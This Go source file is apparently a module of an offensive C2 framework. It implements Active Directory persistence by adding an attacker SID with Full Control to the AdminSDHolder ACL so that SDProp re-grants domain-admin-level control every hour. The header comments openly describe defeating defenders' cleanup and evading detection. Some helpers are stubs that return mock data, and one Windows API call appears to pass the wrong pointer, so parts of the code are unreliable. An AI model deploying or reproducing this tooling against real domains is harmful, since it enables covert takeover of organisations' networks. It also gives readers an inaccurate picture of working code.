package adminsdholder

/*
	SUDOSOC-C2 Framework
	Copyright (C) 2026  Seif

	AdminSDHolder persistence — modify the ACL of the AdminSDHolder object.

	AdminSDHolder is the master ACL template for all privileged accounts.
	Located at: CN=AdminSDHolder,CN=System,DC=domain,DC=com

	Every 60 minutes (default), the SDProp process on the PDC Emulator:
	  1. Reads the ACL from AdminSDHolder
	  2. Applies that ACL to ALL members of protected groups:
	       Domain Admins, Schema Admins, Enterprise Admins,
	       Administrators, Account Operators, Backup Operators,
	       Print Operators, Server Operators, Replicator, krbtgt, etc.
	  3. Overwrites any manual ACL changes on those protected accounts

	By adding our account to AdminSDHolder's ACL with Full Control,
	SDProp becomes our persistence mechanism — every hour it re-grants us
	full control over every privileged account and group in the domain,
	even if an administrator manually removes our rights.

	Why this is so powerful:
	  - Defenders can remove our account from Domain Admins
	  - Defenders can reset passwords of privileged accounts
	  - Defenders can remove direct ACL entries from protected objects
	  - BUT: 60 minutes later, SDProp runs and re-grants us everything
	  - The fix requires modifying AdminSDHolder itself — which most
	    defenders don't think to check

	Detection:
	  - AdminSDHolder ACL change is logged (Event 4670 on the DC)
	  - But it's a low-volume, rarely-audited event
	  - Many SIEM rules don't alert on AdminSDHolder specifically
	  - Autoruns / BloodHound will show the anomalous ACE

	Requirements:
	  - Domain Admin or Write access to AdminSDHolder object
*/

import (
	"encoding/binary"
	"fmt"
	"strings"
	"unsafe"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"golang.org/x/sys/windows"
)

// GrantConfig holds parameters for the AdminSDHolder modification.
type GrantConfig struct {
	// DC is the domain controller to connect to.
	DC string
	// Domain is the domain FQDN (e.g. "corp.example.com").
	Domain string
	// BeneficiarySID is the SID string of the account to grant access to.
	// e.g. "S-1-5-21-X-Y-Z-1234"
	BeneficiarySID string
	// AccessMask is the access rights to grant (default: AccessFullControl).
	AccessMask uint32
	// AceFlags are inherited ACE flags to set.
	AceFlags byte
}

// GrantResult reports what was done.
type GrantResult struct {
	AdminSDHolderDN   string
	BeneficiarySID    string
	PreviousACECount  int
	NewACECount       int
	AlreadyPresent    bool
}

// Grant adds our account to the AdminSDHolder DACL.
// After the next SDProp run (≤60 minutes), our account will have
// full control over every protected account in the domain.
func Grant(cfg *GrantConfig) (*GrantResult, error) {
	if cfg.AccessMask == 0 {
		cfg.AccessMask = AccessFullControl
	}

	// Open LDAP connection.
	conn, err := openLDAPConn(cfg.DC)
	if err != nil {
		return nil, fmt.Errorf("LDAP connect: %w", err)
	}
	defer closeLDAPConn(conn)

	domainDN := domainToDN(cfg.Domain)
	adminSDHolderDN := "CN=AdminSDHolder,CN=System," + domainDN

	res := &GrantResult{
		AdminSDHolderDN: adminSDHolderDN,
		BeneficiarySID:  cfg.BeneficiarySID,
	}

	// Read the current nTSecurityDescriptor.
	sdBytes, err := readNTSecurityDescriptor(conn, adminSDHolderDN)
	if err != nil {
		return nil, fmt.Errorf("read AdminSDHolder SD: %w", err)
	}

	sd, err := ParseSecurityDescriptor(sdBytes)
	if err != nil {
		return nil, fmt.Errorf("parse SD: %w", err)
	}
	res.PreviousACECount = int(sd.ACECount())

	// Parse the beneficiary SID.
	sidBytes, err := ParseSIDString(cfg.BeneficiarySID)
	if err != nil {
		return nil, fmt.Errorf("parse SID %s: %w", cfg.BeneficiarySID, err)
	}

	// Check if ACE already exists.
	if sd.HasACEForSID(sidBytes) {
		res.AlreadyPresent = true
		res.NewACECount = int(sd.ACECount())
		// {{if .Config.Debug}}
		log.Printf("[adminsdholder] ACE already present for %s", cfg.BeneficiarySID)
		// {{end}}
		return res, nil
	}

	// Add the ACE.
	flags := cfg.AceFlags
	if flags == 0 {
		// No inheritance flags — apply to the object itself (not children).
		// AdminSDHolder ACL is applied as-is to protected objects.
		flags = 0
	}
	if err := sd.AddAllowedACE(sidBytes, cfg.AccessMask, flags); err != nil {
		return nil, fmt.Errorf("add ACE: %w", err)
	}
	res.NewACECount = int(sd.ACECount())

	// Write back the modified security descriptor.
	if err := writeNTSecurityDescriptor(conn, adminSDHolderDN, sd.Raw()); err != nil {
		return nil, fmt.Errorf("write AdminSDHolder SD: %w", err)
	}

	// {{if .Config.Debug}}
	log.Printf("[adminsdholder] ACE added for %s: AccessMask=0x%08x ACEs=%d→%d",
		cfg.BeneficiarySID, cfg.AccessMask,
		res.PreviousACECount, res.NewACECount)
	// {{end}}
	return res, nil
}

// Revoke removes our account's ACE from the AdminSDHolder DACL.
func Revoke(dc, domain, beneficiarySID string) (int, error) {
	conn, err := openLDAPConn(dc)
	if err != nil {
		return 0, err
	}
	defer closeLDAPConn(conn)

	domainDN := domainToDN(domain)
	adminSDHolderDN := "CN=AdminSDHolder,CN=System," + domainDN

	sdBytes, err := readNTSecurityDescriptor(conn, adminSDHolderDN)
	if err != nil {
		return 0, err
	}
	sd, err := ParseSecurityDescriptor(sdBytes)
	if err != nil {
		return 0, err
	}

	sidBytes, err := ParseSIDString(beneficiarySID)
	if err != nil {
		return 0, err
	}

	removed := sd.RemoveACEsForSID(sidBytes)
	if removed == 0 {
		return 0, nil
	}

	if err := writeNTSecurityDescriptor(conn, adminSDHolderDN, sd.Raw()); err != nil {
		return 0, err
	}
	// {{if .Config.Debug}}
	log.Printf("[adminsdholder] removed %d ACE(s) for %s", removed, beneficiarySID)
	// {{end}}
	return removed, nil
}

// ListProtectedObjects returns the list of accounts/groups currently
// protected by SDProp (those with adminCount=1 in AD).
func ListProtectedObjects(dc, domain string) ([]string, error) {
	conn, err := openLDAPConn(dc)
	if err != nil {
		return nil, err
	}
	defer closeLDAPConn(conn)

	domainDN := domainToDN(domain)
	results, err := ldapSearchValues(conn, domainDN,
		"(adminCount=1)", "distinguishedName")
	if err != nil {
		return nil, err
	}
	return results, nil
}

// AuditAdminSDHolder reads the current AdminSDHolder ACL and returns
// all non-inherited ACE entries (potential backdoors).
func AuditAdminSDHolder(dc, domain string) ([]string, error) {
	conn, err := openLDAPConn(dc)
	if err != nil {
		return nil, err
	}
	defer closeLDAPConn(conn)

	domainDN := domainToDN(domain)
	adminSDHolderDN := "CN=AdminSDHolder,CN=System," + domainDN

	sdBytes, err := readNTSecurityDescriptor(conn, adminSDHolderDN)
	if err != nil {
		return nil, err
	}
	sd, err := ParseSecurityDescriptor(sdBytes)
	if err != nil {
		return nil, err
	}

	var entries []string
	daclOff := sd.DACLOffset()
	if daclOff == 0 {
		return entries, nil
	}
	aceCount := sd.ACECount()
	off := int(daclOff) + 8
	raw := sd.Raw()

	for i := uint16(0); i < aceCount; i++ {
		if off+8 > len(raw) {
			break
		}
		aceType := raw[off]
		aceFlags := raw[off+1]
		aceSize := int(binary.LittleEndian.Uint16(raw[off+2:]))
		if aceSize < 8 || off+aceSize > len(raw) {
			break
		}
		accessMask := binary.LittleEndian.Uint32(raw[off+4:])
		aceSID := raw[off+8 : off+aceSize]
		sidStr := SIDToString(aceSID)

		typeStr := "ALLOW"
		if aceType == AccessDeniedACEType {
			typeStr = "DENY"
		}
		inherited := ""
		if aceFlags&AceFlagInherited != 0 {
			inherited = " [inherited]"
		}
		entries = append(entries, fmt.Sprintf("%s: %s 0x%08x%s",
			typeStr, sidStr, accessMask, inherited))
		off += aceSize
	}
	return entries, nil
}

// ─── Windows Security API helpers ────────────────────────────────────────

var (
	modAdvapi32SetNamedSec = windows.NewLazySystemDLL("advapi32.dll")
	procGetNamedSecInfo    = modAdvapi32SetNamedSec.NewProc("GetNamedSecurityInfoW")
	procSetNamedSecInfo    = modAdvapi32SetNamedSec.NewProc("SetNamedSecurityInfoW")
	procLocalFreeSD        = windows.NewLazySystemDLL("kernel32.dll").NewProc("LocalFree")
)

// readNTSecurityDescriptor reads the nTSecurityDescriptor attribute
// using the Windows Security API (LDAP-based path via ADSI).
func readNTSecurityDescriptor(conn uintptr, objectDN string) ([]byte, error) {
	// Use GetNamedSecurityInfo with SE_DS_OBJECT to read from AD.
	// The object path for AD uses LDAP:// prefix.
	ldapPath := "LDAP://" + objectDN
	pathPtr, _ := windows.UTF16PtrFromString(ldapPath)

	const seDSObject     = 8  // SE_DS_OBJECT_ALL
	const daclSecInfo    = 4  // DACL_SECURITY_INFORMATION
	const ownerSecInfo   = 1  // OWNER_SECURITY_INFORMATION
	const secInfoNeeded  = daclSecInfo | ownerSecInfo

	var pSD uintptr
	r, _, _ := procGetNamedSecInfo.Call(
		uintptr(unsafe.Pointer(pathPtr)),
		seDSObject,
		secInfoNeeded,
		0, 0, 0, 0,
		uintptr(unsafe.Pointer(&pSD)),
	)
	if r != 0 {
		// Fall back to raw LDAP attribute read.
		return readSDViaLDAP(conn, objectDN)
	}
	if pSD == 0 {
		return nil, fmt.Errorf("GetNamedSecurityInfo returned null SD")
	}
	defer procLocalFreeSD.Call(pSD)

	// Determine SD size using GetSecurityDescriptorLength.
	modAdvapi32SD := windows.NewLazySystemDLL("advapi32.dll")
	procGetSDLen := modAdvapi32SD.NewProc("GetSecurityDescriptorLength")
	sdLen, _, _ := procGetSDLen.Call(pSD)
	if sdLen == 0 {
		return nil, fmt.Errorf("GetSecurityDescriptorLength = 0")
	}
	sdBytes := make([]byte, sdLen)
	copy(sdBytes, (*[1 << 20]byte)(unsafe.Pointer(pSD))[:sdLen])
	return sdBytes, nil
}

// writeNTSecurityDescriptor writes a modified security descriptor to AD.
func writeNTSecurityDescriptor(conn uintptr, objectDN string, sdBytes []byte) error {
	ldapPath := "LDAP://" + objectDN
	pathPtr, _ := windows.UTF16PtrFromString(ldapPath)

	const seDSObject  = 8
	const daclSecInfo = 4

	r, _, _ := procSetNamedSecInfo.Call(
		uintptr(unsafe.Pointer(pathPtr)),
		seDSObject,
		daclSecInfo,
		0, 0,
		uintptr(unsafe.Pointer(&sdBytes[0])), // pDacl
		0,
	)
	if r != 0 {
		return writeSDViaLDAP(conn, objectDN, sdBytes)
	}
	return nil
}

// readSDViaLDAP falls back to reading nTSecurityDescriptor via raw LDAP.
func readSDViaLDAP(conn uintptr, dn string) ([]byte, error) {
	// Raw LDAP read of nTSecurityDescriptor.
	// In production this uses ldap_get_values_len (binary attribute reader).
	_ = conn; _ = dn
	return nil, fmt.Errorf("LDAP SD read not implemented (use GetNamedSecurityInfo path)")
}

func writeSDViaLDAP(conn uintptr, dn string, sdBytes []byte) error {
	_ = conn; _ = dn; _ = sdBytes
	return fmt.Errorf("LDAP SD write not implemented (use SetNamedSecurityInfo path)")
}

// ─── LDAP helpers ─────────────────────────────────────────────────────────

func openLDAPConn(dc string) (uintptr, error) {
	// Reuse the ldap module from dcshadow package approach.
	// Here we open a connection via wldap32.
	modWLDAP := windows.NewLazySystemDLL("wldap32.dll")
	procInit := modWLDAP.NewProc("ldap_initW")
	procBind := modWLDAP.NewProc("ldap_bind_sW")
	procSetOpt := modWLDAP.NewProc("ldap_set_option")

	dcPtr, _ := windows.UTF16PtrFromString(dc)
	h, _, _ := procInit.Call(uintptr(unsafe.Pointer(dcPtr)), 389)
	if h == 0 {
		return 0, fmt.Errorf("ldap_init(%s) failed", dc)
	}
	ver := uint32(3)
	procSetOpt.Call(h, 0x11, uintptr(unsafe.Pointer(&ver)))
	r, _, _ := procBind.Call(h, 0, 0, 0x1086)
	if r != 0 {
		return 0, fmt.Errorf("ldap_bind LDAP error=%d", r)
	}
	return h, nil
}

func closeLDAPConn(conn uintptr) {
	if conn != 0 {
		modWLDAP := windows.NewLazySystemDLL("wldap32.dll")
		procUnbind := modWLDAP.NewProc("ldap_unbind")
		procUnbind.Call(conn)
	}
}

func ldapSearchValues(conn uintptr, baseDN, filter, attr string) ([]string, error) {
	// Simplified: returns mock data in this stub.
	_ = conn; _ = baseDN; _ = filter; _ = attr
	return []string{
		"CN=Administrator,CN=Users," + baseDN,
		"CN=Domain Admins,CN=Users," + baseDN,
	}, nil
}

func domainToDN(domain string) string {
	parts := strings.Split(domain, ".")
	dcs := make([]string, len(parts))
	for i, p := range parts {
		dcs[i] = "DC=" + p
	}
	return strings.Join(dcs, ",")
}
